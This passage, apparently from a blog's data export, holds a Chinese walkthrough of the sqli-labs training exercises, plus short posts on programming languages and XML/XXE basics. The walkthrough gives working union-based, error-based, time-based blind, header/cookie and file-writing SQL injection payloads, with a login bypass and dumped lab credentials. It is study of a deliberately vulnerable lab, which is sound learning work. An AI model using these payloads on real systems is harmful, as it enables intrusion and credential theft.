table_name=&#39;users&#39;--+\n回显：\nYour Login name:id,username,password\nYour Password:2\n\n爆破这些字段的所有数据?id=-1&#39; union select 1,group_concat(concat(&#39;(&#39;,id,&#39;,&#39;,username,&#39;,&#39;,password,&#39;)&#39;) separator &#39;&lt;br /&gt;&#39;),2 from users--+回显：\n\n\nYour Login name:(1,Dumb,Dumb)\n(2,Angelina,I-kill-you)\n(3,Dummy,p@ssword)\n(4,secure,crappy)\n(5,stupid,stupidity)\n(6,superman,genious)\n(7,batman,mob!le)\n(8,admin,admin)\n(9,admin1,admin1)\n(10,admin2,admin2)\n(11,admin3,admin3)\n(12,dhakkan,dumbo)\n(14,admin4,admin4)\nYour Password:2\n\nLess-2\n分别以基于数字型和基于字符型的错误来判断：\n\n\n基于数字型：?id=1 and 1=2--+无回显\n基于字符型：?id=1&#39; and 1=2--+回显：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; and 1=2-- LIMIT 0,1&#39; at line 1说明这是基于数字型的注入。\n\n\n猜测列数：?id=1 order by 5--+最后得到也是3列。\n爆破表名?id=-1 union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()--+回显：Your Login name:emails,referers,uagents,users\nYour Password:24.爆破users表的所有字段：?id=-1 union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+回显：Your Login name:id,username,password\nYour Password:2\n爆破这些字段的所有数据?id=-1 union select 1,group_concat(concat(&#39;(&#39;,id,&#39;,&#39;,username,&#39;,&#39;,password,&#39;)&#39;) separator &#39;&lt;/br&gt;&#39;),2 from users--+回显：\n\nYour Login name:(1,Dumb,Dumb)\n(2,Angelina,I-kill-you)\n(3,Dummy,p@ssword)\n(4,secure,crappy)\n(5,stupid,stupidity)\n(6,superman,genious)\n(7,batman,mob!le)\n(8,admin,admin)\n(9,admin1,admin1)\n(10,admin2,admin2)\n(11,admin3,admin3)\n(12,dhakkan,dumbo)\n(14,admin4,admin4)\nYour Password:2\n\n总结一下前面这两个题的--+实际上和#是一样的，都表示注释，所以在--+前面的注入语句都是可以进入到数据库查询的，这就是这个类型SQL注入的payload。\nLess-3\n猜测注入类型：?id=1&#39;回显：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1得知这是基于字符型的错误，而且还有个重要的信息就是id后面还有个后括号！\n爆破表名?id=-1&#39;) union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()--+回显：Your Login name:emails,referers,uagents,usersYour Password:2`\n爆破users表的所有字段：?id=-1&#39;) union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+回显：Your Login name:id,username,password\nYour Password:24.爆破这些字段的所有数据?id=-1&#39;) union select 1,group_concat(concat(&#39;(&#39;,id,&#39;,&#39;,username,&#39;,&#39;,password,&#39;)&#39;) separator &#39;&lt;/br&gt;&#39;),2 from users--+回显：\n\nYour Login name:(1,Dumb,Dumb)\n(2,Angelina,I-kill-you)\n(3,Dummy,p@ssword)\n(4,secure,crappy)\n(5,stupid,stupidity)\n(6,superman,genious)\n(7,batman,mob!le)\n(8,admin,admin)\n(9,admin1,admin1)\n(10,admin2,admin2)\n(11,admin3,admin3)\n(12,dhakkan,dumbo)\n(14,admin4,admin4)\nYour Password:2\n\nLess-4\n猜测?id=1 and 1=2--+\n?id=1&#39; and 1=2--+\n?id=1&#39;) and 1=2--+回显均正常。?id=1&quot; and 1=2--+回显报错。尝试?id=1&quot;) and 1=2--+无回显，则表示是基于字符型错误，且还有括号。\n爆破字段的所有数据?id=-1&quot;) union select 1,group_concat(concat(&#39;(&#39;,id,&#39;,&#39;,username,&#39;,&#39;,password,&#39;)&#39;) separator &#39;&lt;/br&gt;&#39;),2 from users--+回显：\n\nYour Login name:(1,Dumb,Dumb)\n(2,Angelina,I-kill-you)\n(3,Dummy,p@ssword)\n(4,secure,crappy)\n(5,stupid,stupidity)\n(6,superman,genious)\n(7,batman,mob!le)\n(8,admin,admin)\n(9,admin1,admin1)\n(10,admin2,admin2)\n(11,admin3,admin3)\n(12,dhakkan,dumbo)\n(14,admin4,admin4)\nYour Password:2\n\nLess-5\n判断注入类型?id=1 and 1=2--+\n?id=1&#39; and 1=2--+前者正常而后者报错，说明这是单引号的字符型错误。\n猜列数?id=1&#39; order by 4--+?id=1&#39; order by 3--+回显是前者报错为Unknown column &#39;4&#39; in &#39;order clause&#39;，后者回显You are in...........，说明是3列。\n猜测数据库名?id=1&#39; union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a --+根据回显得知当前数据库名为 security。\n列举数据表数量和数据表名?id=1&#39; union select 1,count(*),concat_ws(&#39;QQQQ&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39;),floor(rand()*2))as a from information_schema.tables group by a--+根据回显得到4.这里遇到了很多麻烦，最后查到要用limit限制一下，最后得到数据表名为emails, referers, uagents, users。5.爆破数据?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select concat_ws(char(32,44,32),id,username,password) from users limit 1,1),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a--+一直更改limit的值就可以爆破数据了。\n\nLess-6\n猜测注入类型发现仅仅是跟Less-5不同的是这里是双引号注入。\n\nLess-7这个题实在是没遇见过，查看了源码。网上查找资料参考了一下，原来是导出文件GET字符型注入（双括号单引号字符型注入）\n\n查看列数?id=1&#39;)) order by 3--+根据回显判断确实是3列。且根据前面的报错是数据库select ... into outfile语法的使用，上网又查了一些资料，构造如下语句：?id=1%27))%20union%20select%20*%20from%20users%20into%20outfile%20%27G:\\\\phpStudySetup\\\\PHPTutorial\\\\WWW\\\\sqli-labs\\\\Less-7\\\\data.txt%27--+回显：You have an error in your SQL syntax又跑到网上查询了一下，原来是权限不够，用这个语句试试?id=1&#39;)) and user()=&#39;root@localhost&#39;--+得知权限不够。如下图：接着打开MYSQL配置文件my.ini设置(添加)参数secure_file_priv =参考：mysql secure_file_priv 文件读写问题保存重启MYSQL就OK了。即使回显You have an error in your SQL syntax，但是到文件目录可以看到文件已经下载下来了！！！\n\n\nLess-8\n测试注入类型?id=1&#39; and 1=2--+无回显判断为基于错误类型的单引号注入。2.依据上题思路下载数据信息?id=1&#39; union select * from users into outfile &#39;G:\\phpStudySetup\\PHPTutorial\\WWW\\sqli-labs\\Less-8\\\\less8.txt&#39;--+\n\nLess-9\n测试注入类型网上参考了些资料加之分析了一下源代码，原来是基于时间的单引号注入。因为以下两个语句明显看到后者反应时间变长了：?id=1 and sleep(5)--+?id=1&#39; and sleep(5)--+\n猜测数据库名长度?id=1&#39; and if(length(database())=number,1,sleep(5))--+不断改变number值，当某个值正好无明显的延时的时候则表示这个数字就是数据库名长度，最后得到8。\n爆破数据库名?id=1&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+\n爆破数据库名爆表名?id=1’ and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,1,sleep(5))–+\n爆破数据表名?id=1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1),1,1))=105,1,sleep(5))--+\n爆破数据?id=1&#39; and if(ascii(substr((select id from security.users limit 0,1),1,1))=0x31,1,sleep(5))--+id=1&#39; and if(ascii(substr((select username from security.users limit 0,1),1,1))=68,1,sleep(5))--+\n\nLess-10\n判断注入类型将上题的单引号改为双引号后，发现对了，正好就是基于时间错误的双引号注入。\n\nLess-11这个题是POST类型的注入，我这里使用的是Firefox的插件Hackbar。注意在 Mozilla FireFox 的 Hackbar 中，Post data 的注释用 –&lt;空格&gt; 而不是 –+ （很奇怪），导致我原来一直报错，然后我就把注释改成 # 了\n\n检查表单的用户名和密码的name属性：\n\n\n\n判断注入类型在 username 中输入 admin&#39;--+，很奇怪，若输入admin&#39;#则直接获得admin的信息了。在 password 中输入任意内容回显内容： You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1&#39; LIMIT 0,1&#39; at line 1根据回显判断为：基于错误的POST型单引号字符型注入。或者使用万能密码：\n\n在 username 中输入 admin' or '1'='1 \n在 password 中输入任意内容\n\n\n猜列数uname=1&amp;passwd=1&#39; or 1 order by 3#&amp;submit=Submituname=1&amp;passwd=1&#39; or 1 order by 2#&amp;submit=Submit说明有2列。\n结合Less-1爆破表名uname=1&amp;passwd=1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#回显：Your Login name:1\nYour Password:emails,referers,uagents,users\n爆破列名uname=1&amp;passwd=1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;#回显：Your Login name:1\nYour Password:id,username,password\n爆破数据uname=1&amp;passwd=1&#39; union select 1,group_concat(concat(&#39;(&#39;,id,&#39;,&#39;,username,&#39;,&#39;,password,&#39;)&#39;) separator &#39;&lt;/br&gt;&#39;) from users#回显：\n\nYour Login name:1\nYour Password:(1,Dumb,Dumb)\n(2,Angelina,I-kill-you)\n(3,Dummy,p@ssword)\n(4,secure,crappy)\n(5,stupid,stupidity)\n(6,superman,genious)\n(7,batman,mob!le)\n(8,admin,admin)\n(9,admin1,admin1)\n(10,admin2,admin2)\n(11,admin3,admin3)\n(12,dhakkan,dumbo)\n(14,admin4,admin4)\n\nLess-12\n判断注入类型这个题花了我很多时间，主要还是因为题目说是双引号，所以我就试了很多次都没成。但是最后看了一下源代码，原来是双引号与括号的闭合。故是在上一个题的基础上，把单引号&#39;改成&quot;)就可以了。\n爆破数据uname=1&amp;passwd=1&quot;) union select 1,group_concat(concat(&#39;(&#39;,id,&#39;,&#39;,username,&#39;,&#39;,password,&#39;)&#39;) separator &#39;&lt;/br&gt;&#39;) from users#回显：\n\nYour Login name:1\nYour Password:(1,Dumb,Dumb)\n(2,Angelina,I-kill-you)\n(3,Dummy,p@ssword)\n(4,secure,crappy)\n(5,stupid,stupidity)\n(6,superman,genious)\n(7,batman,mob!le)\n(8,admin,admin)\n(9,admin1,admin1)\n(10,admin2,admin2)\n(11,admin3,admin3)\n(12,dhakkan,dumbo)\n(14,admin4,admin4)\n\nLess-13\n判断注入类型username 输入 admin&#39;\npassword 输入 任意内容回显报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1&#39;) LIMIT 0,1&#39; at line 1得知后面还有一个括号，本以为将Less-12的双引号&quot;改成单引号&#39;就可以了，但是这个题没有报错。\n爆破数据库名方法一：二分法方法二：双查询报错uname=1&amp;passwd=1&#39;) union select count(*),concat(&quot;~~&quot;,(select database()),&quot;~~&quot;,floor(rand()*2))as a from information_schema.tables group by a#回显：Duplicate entry &#39;~~security~~1&#39; for key &#39;group_key&#39;得到数据库名是security\n猜测数据表名uname=1&amp;passwd=1&#39;) union select count(*),concat(&quot;~~&quot;,(select table_name from information_schema.tables where table_schema=database() limit 3,4),&quot;~~&quot;,floor(rand()*2))as a from information_schema.tables group by a#不断更改limit的值就可以了。回显：Duplicate entry &#39;~~users~~1&#39; for key &#39;group_key&#39;4.爆破数据不断更改limit值即可uname= &#39;) union select 1,2 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &#39;) or 1=1 #\n\nLess-14\n猜测注入类型username 输入 admin&quot;\npassword 输入 任意实际上就是将上一题的&#39;)改为&quot;即可。\n爆破数据uname= &quot; union select 1,2 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &#39;) or 1=1 #不断更改limit即可。\n\nLess-15\n注入类型判断uname=admin&#39; or &#39;1&#39;=&#39;1回显成功，但是根据题目提示，最后判为延时型的注入。\n爆破数据借助于Less-13即可\n\nLess-16\n判断注入类型 构造语句uname=admin&quot;)判断出是双引号加括号的注入，但是不报错。后来看了源码，是基 于时间错误的注入。\n爆破数据 借助于Less-13即可。\n\nLess-17\n判断错误类型 这个题实在是找不到是啥注入，后来看了源码，首先有个过滤函数，check_input、check_input首先判断不为空，就截取前15个字符，当magic_quotes_gpc=On的时候，函数 get_magic_quotes_gpc()就会返回1。当magic_quotes_gpc=Off的时候，函数 get_magic_quotes_gpc()就会返回0。 magic_quotes_gpc函数在php中的作用是判断解析用户提示的 数据，如包括有:post、get、cookie过来的数据增加转义字符\\，以确保这些数据不会引起程序，特别是数据库 语句因为特殊字符引起的污染而出现致命的错误。若开了就将转义符去掉。 ctype_digit判断是不是数字， 是数字就返回true，否则返回false。是字符就用mysql_real_escape_string过滤，其实基本就是转义 （转义SQL语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集），这样就把宽字节cut了。是数 字也要用intval转化成int，因为传过来的是字符型数字。\n爆破数据库名 uname=admin&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#得到： XPATH syntax error: &#39;~security~&#39;\n\n爆破数据表名 uname=admin&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#得到： XPATH syntax error: &#39;~emails,referers,uagents,users~&#39;\n\n爆破数据 uname=admin&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(select username from (select username from users)a limit 0,1),0x7e),1)#\n\n\nLess-18\n判断注入类型 查看了一下源码，得知这个题启用了代理。\n爆破数据表名 参考Less-5 1&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()limit 0,1),0x7e),1) and &#39;1&#39;=&#39;1即可得到数据。\n\nLess-19\n判断注入类型 查看了源码，这关跟18关差不多，就是有点稍微的变化，这关改的是Referer。\n\n查数据表名 把Referer改为：&#39;or updatexml(&#39;1&#39;,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1)),0),&#39;~&#39;)#\n\n爆破数据 把Referer改为：&#39;or extractvalue(1,concat(&#39;~&#39;,(select\nconcat(&#39;~&#39;,username,password) from users limit 1,1))),&#39;&#39;)# 即可。\n\n\nLess-20\n判断错误类型 查看了源码发现跟上题差不多，只不过是将Referer改为Cookie即可了。\n爆破数据 使用 burpsuite-reperter 抓包添加一行 cookie 值，将Cookie值设置为uname=1&#39;and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#即可。\n\nLess-21\n判断错误类型 查看了一下源代码，本关对 cookie 进行了 base64 的处理，其他的处理流程和 less20 是一样 的。 我们这里可以利用 less20 同样的方法，但是需要将 payload 进行 base64 编码处理（注意这里对uname 进行了(‘uname’)的处理） Cookie： uname=YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2Vka XIpLDB4N2UpKSM= 在浏览器输入正确的用户名和密码 admin:admin 修改 cookie 值为uname=admin1&#39;and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#。接着使用上一题的方法即可。\n\nLess-22\n判断错误类型 插卡看源代码，Cookie 处理方式和上题是一样的，都用了 base64 编码，唯一的不同是闭合方 式变成了双引号。 admin1&quot;and extractvalue(1,concat(0x7e,(select database()),0x7e))# base64 编码之后：cookie： YWRtaW4xImFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB 4N2UpKSM= 最后更改闭合方式结合less20、less21 可以构造payload即可。\n\n","thumbnail":"https://i.loli.net/2019/03/03/5c7aadc5c06f9.jpg","plink":"https://Directoree.github.io/post/sqli-labs/"},{"title":"浅谈 C 和其他语言","date":"2019-05-01T09:20:35.000Z","updated":"2019-05-01T15:06:03.618Z","content":"大体谈谈近来对C以及其他一些语言的学习心得……\n\n\n一. C++ 的学习    C++在两年前大一时候课程学习过，包括C++课程设计。数据结构也是基于C++来讲的，大二时候专门有一个课程是程序设计，主要就是利用C++和C#做一些小项目（比如我的第一个小项目就是基于MFC的的图形化界面的计算器）。大三时侯的算法课就是完全是使用C++做算法题，当时还有专门的实验课就是算法课包括期末上机测试。后来的课程学习了Java，到了大三的密码学课程设计写密码算法我的密码算法是使用C++和Java。在我看来C++的灵魂来自于类Class（面向对象）和从C那里继承过来的指针了，因为在我看来指针的真的是无所不为，功能可以为所欲为。    这一路来一直都是在使用C++，不得不说C++在底层运用可见一斑了。然而语言只不过是最最基础的东西了，算法才是使用语言写出来的最具色彩的东西了，算法也可以说把语言展现得淋漓尽致。聪慧的思维逻辑和熟能生巧的技能无非是算法设计的支柱。    然而对于上面层次的设计应用C++似乎并不能运用自如，加之Web安全的学习必要性，使我不得不对前端语言以及前端设计有一定的了解和掌握。\n二. C 的学习    C语言在我看来应该算是众多语言的父辈级别的语言了，C++继承自C毋庸置疑，Java完全面向对象但是又高于此，继承了C的语言特性、C++的类的特性，但是又开辟了类的新特性。但是归根还是离不开C。近来由于需要学习了一遍C语言的大致语法特性，不得不说大哥还是大哥。至此在C++的基础上来学习了一遍C，确实是有不少感触。    我认为C的灵魂所在就是指针了，真的是无所不能，可以为所欲为！\n仅以面向过程的比较C和C++的话：\n\n不同的是\nC没有C++具备的字符串类型，而用char类型的数组或者指针来当作字符串使用，但是字符串最后一个字符必须要强调一下必须是&#39;\\0&#39;才行（不是ASCII48的数字0，而是ASCII为0的NUL字符）；\n输入输出方式不同； \n动态内存申请和释放的函数不同。\n头文件包含C++省略了.h，而使用小写c开头。如C是#include &lt;math.h&gt;，C++是#include &lt;cmath&gt;\n\n\n基本相同的是：数据类、运算符、表达式顺序结构、控制结构、循环结构、数组、函数、指针、结构体、共用体、枚举类型、文件\n\n三. Java 的学习    Java的初次学习是在一年前的课程上，后来设计比较少。总的来说，Java应该算是在语言里最难研究的一门语言了，多线程处理、高并发机制、JVM原理等都是其重点核心。由于它是纯面向对象的一门语言，所以会在C++的基础上多了非常多的特性，包括最基础的在类里面又直接定义一个类这种行为、属性的覆盖、方法的重载等。    值得注意的是，Java并没有C++类的多重继承，即一个类继承多个类。Java的一个类只能有一个父类，所以Java提供了接口（Interface），让类去继承（extends）这个接口，解决了C++中比较复杂的继承关系，但是又开创了新的继承方式。比如使用了在接口内定义上的抽象（Abstract）方法，让继承这个接口的类非常自由地去重载这个方法。这种接口的继承方式影响深远，PHP语言继承类（extends）也是使用这种方法。    还有一个更加值得一提的是锁的处理机制，当然有的需求仅用Synchronized是远远不够的，还需要其他一些方式。    我认为学习Java不应该总是对照着C++来学习，因为他们相似甚少，而Java这种纯面向对象却更加的‘硬核’……\n四. Python 的学习    由于Python这种极具吸引力的、更加“奔放”的编程语言有着自带强大吸引力的能力，我觉得每个人都应该学一学这一门语言。“人生苦短，我用python。”，两年前的课上在张老师的PPT里我第一次看到这句话，当时还以为老师在讲个程序员才能懂的冷笑话。直到现在，我也懂了这句话，原来说的是心里话！C++一段代码能处理的事而Python只需要一句话……给我最大的感受还是for  in :这个语法，是的这个语法太强大了（比如迭代器的使用）。    先说说Python语法的free，一行里除非使用了多条语句，不然直接吊到不用是;这个结束符来表示一个语句的结束（人家直接不用语句结束符就能表示一个语句结束，自由到有些骄傲 ╮(╯▽╰)╭ ……）。再说说一个语句块是不会放到一对花括号{}里滴，因为Python是种能有多自由就有多节约的语言，人家的花括号用来表示字典，不然浪费了。所以Python的语句块是以代码缩进来标识的，这就对编程的规范性提出了非常苛刻的要求了—缩进必须相同，不然视为错误，而且还要有冒号来提醒接下来的是缩进代码块。\n\nfor x in a:\nwhile 表达式:\nPython不支持switch而使用elif来选择\n模块和包应该要使用得很溜才行！！！\n……\n\n当然了除了C、C++、Java，比如Python、PHP、Javascript、MYSQL、HTML、CSS等单双引号都可以的啦，只不过应该注意单引号应该放在双引号里面，双引号应该放在单引号里面，且对于PHP来说，单引号里面的变量是不会被解析滴…..总的来说，写脚本，数据分析等丰富的库和接口…非常多的功能真的太多了，直接用Python就好了，真的是太棒了。这是门必须要学好用好的语言，应该是必备的，更应该是标配！\n五. PHP 的学习    Web安全不会PHP那应该是在扯淡了，这门服务器端的语言实在是太棒了，语法自由好用，相对C这些来说简直是神赐的礼物，”PHP是世界上最好的语言”….功能强大，但是不能不承认，漏洞最多的语言我觉得非它莫属了…..    命名空间应该要重点掌握我觉得，因为在框架中频繁使用！！！\n六. CSS、MYSQL、HTML、Javascript、XML等    CSS、MYSQL、HTML、Javascript、XML等这一套前端标配，对搞Web安全来说真的是必须要搞好的……\n 下面是我的关于内存管理的一些误区，我也整理了一下。(1)\n\n\n数据段\n代码段data、bss\n栈\n堆 \n\n\n(2)C语言的\n\n static、const、auto、register、extern\n\n\n","thumbnail":"https://i.loli.net/2019/05/01/5cc9b356972c7.jpg","plink":"https://Directoree.github.io/post/c-grammer/"},{"title":"XXE-XML","date":"2019-04-19T17:00:02.000Z","updated":"2019-04-21T16:52:23.977Z","content":"最近遇到一些事，使我不得不抓紧时间学习一下XXE相关的漏洞知识~~~\n\n\nXXE-XML \n\n\n\n一. XML1.1 基本概念\n\n什么是XML？\n为什么要使用XML？\n怎么使用XML？\n为什么着重强调DTD？\n\n\n1. XML 是什么？\n\n指可扩展标记语言（EXtensible Markup Language）。\n是一种很像HTML的标记语言。\n的设计宗旨是传输数据，而不是显示数据。\n标签没有被预定义。您需要自行定义标签。\n被设计为具有自我描述性。\n是 W3C 的推荐标准。\n\n可以参考：[XML是什么，它可以做什么？——XML详解]\n2. 为什么要使用XML？参考：[XML 用途]     \n(1) XML 把数据从 HTML 分离\n\n\n如果您需要在 HTML 文档中显示动态数据，那么每当数据改变时将花费大量的时间来编辑 HTML。\n通过 XML，数据能够存储在独立的 XML 文件中。这样您就可以专注于使用 HTML/CSS 进行显示和布局，并确保修改底层数据不再需要对 HTML 进行任何的改变。\n通过使用几行 JavaScript 代码，您就可以读取一个外部 XML 文件，并更新您的网页的数据内容。\n\n\n(2 )XML 简化数据共享\n\n\n在真实的世界中，计算机系统和数据使用不兼容的格式来存储数据。\nXML 数据以纯文本格式进行存储，因此提供了一种独立于软件和硬件的数据存储方法。\n这让创建不同应用程序可以共享的数据变得更加容易。\n\n\n(3) XML 简化数据传输\n\n\n对开发人员来说，其中一项最费时的挑战一直是在互联网上的不兼容系统之间交换数据。\n由于可以通过各种不兼容的应用程序来读取数据，以 XML 交换数据降低了这种复杂性。\n\n\n(4) XML 简化平台变更\n\n\n升级到新的系统（硬件或软件平台），总是非常费时的。必须转换大量的数据，不兼容的数据经常会丢失。\nXML 数据以文本格式存储。这使得 XML 在不损失数据的情况下，更容易扩展或升级到新的操作系统、新的应用程序或新的浏览器。\n\n\n3. 怎么使用？\n可以是这样\n&lt;person age=\"too young\" experience=\"too simple\" result=\"sometimes naive\" />\n\n也可以是这样\n&lt;person>\n    &lt;age value=\"too young\" />\n    &lt;experience value=\"too simple\" />\n    &lt;result value=\"sometimes naive\" />\n&lt;/person>\n\n还可以这样\n&lt;person>\n    &lt;age>too young&lt;/age>\n    &lt;experience>too simple&lt;/experience>\n    &lt;result>sometimes naive&lt;/result>\n&lt;/person>\n\n但是更推荐使用第三种！主流使用的也是第三种。\n4. 为什么着重强调DTD？\nDTD实体：DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。\n实体又分为一般实体和参数实体\n\n一般实体的声明语法:&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;引用实体的方式：&amp;实体名；\n参数实体只能在DTD中使用，参数实体的声明格式： &lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;引用实体的方式：%实体名；\n\n1，何为XXE？答： xxe也就是xml外部实体注入。也就是上述的那一部分。\n2，怎样构建外部实体注入？方式一：直接通过DTD外部实体声明\n可参考：[xxe漏洞的学习与利用总结]\n\n1.2 使用XML实际写文档一般这样用：（新版本）可参考[XML 文档构建模块]\n\n所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：\n\n元素\n属性\n实体   \n&amp;lt;表示&lt;\n&amp;gt;表示&gt;\n&amp;amp;表示&amp;\n&amp;apos;表示&#39;\n&amp;quot;表示&quot;\n\n\nPCDATA ：被解析的字符数据（parsed character data）\nCDATA  ：不会被解析的字符数据（character data）\n两种文档约束：DTD、Schema\n\n\n包含上面那几部分以后，文档还要有一个规范来约束，即需要对自己写的文档进行验证， 验证器会对在自己写的验证规则中对XML文件进行语法检查。\n为什么要有约束？因为XML文件的标签和属性可以随意扩展，有时我们必须要限制每个文档有哪些元素，每个元素有哪些子元素，每个元素有哪些属性，属性的值是什么类型等。从而保证XML文档格式和数据的正确性。\n\n实例\n&lt;!--文档的声明-->\n&lt;!--还有个属性standalone:很少使用，是否是一个单独的XML文件，取值是true或false。默认是true-->\n&lt;!--元素 note、to、from、body等叫做元素，Tove叫做To这个元素的值value，而sex叫做属性，\nfemale叫做属性的值-->\n&lt;!--注释和HTML一样-->\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>   \n&lt;note>\n&lt;to sex='female'>Tove&lt;/to>       \n&lt;from>Jani&lt;/from>\n&lt;heading>Reminder&lt;/heading>\n&lt;body>Don't forget me this weekend!&lt;/body>\n&lt;/note>\n\n\nXML由七种组成元素构成（老版本）\n\n文档的声明\n元素\n属性\n注释\n实体字符，如\n&amp;lt;表示&lt;\n&amp;gt;表示&gt;\n&amp;amp;表示&amp;\n&amp;apos;表示&#39;\n&amp;quot;表示&quot;\n\n\n字符数据区 [!CDATA[内容]]\n处理指令\n\n\n关于学习的资料可参考：[XML 教程]、[XML 文档结构简介（一）]、[XML]、[XML]\n下面是我的一些关于学习XML的笔记😁(●ˇ∀ˇ●)\n\n\n\n\n\n\n二. DTD2.1 基本概念DTD为英文(Document Type Definition)，中文意思为“文档类型定义”。\nDTD肩负着两重任务：一方面它帮助你编写合法的代码，另一方面它让浏览器正确地显示器代码。\nDTD扮演着很重要的角色，会使代码变得规范性，打个比方：\n\n良好的xml文档：符合xml的语法规则。有效的xml文档：符合xml语法规则的同时还需要符合DTD文档类型定义。利用DTD可以对xml文档的各个节点进行约束定义，使开发遵循一套“标准”。DTD可以约束xml文档出现的元素，元素名称，元素的先后顺序，属性等。\n\n推荐参考：[XML中的DTD是什么？]、[XML之自定义DTD约束]、[XML中DTD介绍及使用]\n\n2.2 使用DTD\n三. XXE漏洞","thumbnail":"https://i.loli.net/2019/04/20/5cb9fa4757dd7.jpg","plink":"https://Directoree.github.io/post/xxe-xml-dtd/"},{"title":"台儿庄古镇","date":"2019-04-06T10:20:47.000Z","updated":"2019-04-06T10:21:35.799Z","content":"\n\n  \n  \n    Welcome to my blog, enter password to read.\n    \n  \n\nIncorrect Password!\nNo content to display!\n\nU2FsdGVkX1/LTJMLlKqKEfPcsOlsFhKtflgWc4P/34tI3K7Ga4wBPR6BhR/Nm4+jP1koVHgT4SL+ff86+I+JnwPVsvnkkZAq//byo+J+XmHeux9wP8nbVjUD/2MVmgBZHVLb3FtItvBMGMc+Tij1nndTW17jXyugWXK0Fpv5dKqUnMuSXtyLV7DpPMf16ZohWRTXlVGFgSvWEDyFEoVUV8AH6nzME2QNciN5fwRf0iD+BBxBTC65vsYQh17fVJppyzj9EK0lcMdZODlw7cljc6oDUtIfHzhNqwmhDUwoD06G0Zty78s2w3SuCfuMPpvZsIZnsGTqUnoEMmQ+TxITbKH2rVqCH8Uo38ezxMTzO97aqyw480DLjaatHTnf05MN0qc3nIUSo09w4tfFlvFQwQs8a0X8KM9U4D4gfNYRxG8KS8x95oCesVc+bTLAlbUK47yxM+D10Q9MQQFcS+me1iAl0Il+NRyuolsneLZjM0QeYWFIDhjJHGhxMKUAaYZmvtx21BMvxzgSrkpq6v1G9hjezEkrn5GZ2HixMsOF5nOlss3mk4yCB5p7Yt/BzbTvcHuJwOuq5wnxOnj1o3jZZiksTH1Hjr1hni+BfzAa0rCbF7iiOt+8j90snDfEYxxoOiDlY46gdPUgtS1OntG459xrjNVpg/k1CuTcLYbeOSXncIzZ3C3mF3ak+UEtfC8g+E49Ixlp4Y94fTsc4pyG3Ccw50D5Q61Ow6jDTJg0tgPLK0gxvKOTcsPTe6U+VBpHaL8A340rRLgTCLPW72UmQKePqGRDKwgY0bx0d6i+0OuNzl5/qt/0OLjsORikuZWbxShHlAavfrXhgFn9yFRbotfg+Y8MrBQA9LY9uElmeQx/8VWBQjC1SFH+1Ui5N1HuKSmc1ILDM4GCttXz48v4/sZwoPdI8XlbcohKaxFykrsx9oWIRwSi3z2Y+V9EovOOSkrx8qXxftKye5BcLi0pfX42KInukiH5JlefFyEi4CvItNfOsweucTobChrV5y2XRxNJDwfQcNqNdxeUBGUYt2/M5TK2Ami8tQFg/lNHV7ws/qS799vcz6q/Urwtb1YMY8XCw/eYe0MNLlcf375mHJhQWdcffjU/8rG/RU/D1V1fLgIylmJlRMQpawO9BFxE2HWHFHAShc2gICNFNI7o+2I8ixTTEV/6Nun8f3vm/cYW7P8/yZi7cR6HNhXHb7pUl9Nu8SRJQgQnvxmnWn8Iv5LkvXviOvZvxCxe1Wh79LLW//Ltl3fbN+9XXpDiDmc7ancWV4f8B/kZvTVDeBYEBH3FBioPyGu/hwlzm294J8f8xF0yo06oSJ+thkXsLgEk6TWWhSr92tjwSZOIv/qWwXFridjLO4jzjFzZ7EA53F5fmh1+Q1CoB5pXQI6lAVdUy7cxX2eD5IU8cRVFrHeHbbPP0RXs1PRIrsvXNfQOySnzYGrhWGy7rUq30kbYEWZXxL7PJ7Vzjt5ad79CR9vzTRTZx/bZrqQTo0E9in4U0yX/dm0PcmVhyhPwfSw7kQveiK0lZ5eWxfzBKxjKsREACLEIQz5Hy2TaVnwzJ5KCZ/ndYQtq6KLhEHzPDQvMIsvuYne05YNGE4COB9MtG60C9rfT1Gh2L03Bxjm+52giYq3